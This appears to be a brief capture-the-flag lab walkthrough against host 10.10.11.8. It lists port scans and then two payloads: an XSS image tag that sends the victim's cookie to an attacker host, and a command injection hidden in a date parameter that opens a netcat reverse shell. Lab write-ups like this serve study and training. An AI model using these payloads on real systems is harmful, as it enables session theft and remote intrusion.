```bash
rustscan -t 1500 -a 10.10.11.8 -- -sC
```

2 ports:
```bash
rustscan -t 10000 -u 5000 -b 500 -a 10.10.11.8
```

```
└──╼ $ sudo nmap -p22,5000 10.10.11.8 -sCV
...
`<img src=x onerror="location.href='http://10.10.16.13:8000/?c="+document.cookie>`

Payload shell:
`date=2023-09-27;nc%2010.10.16.13%201234%20-e%20%2Fbin%2Fbash`
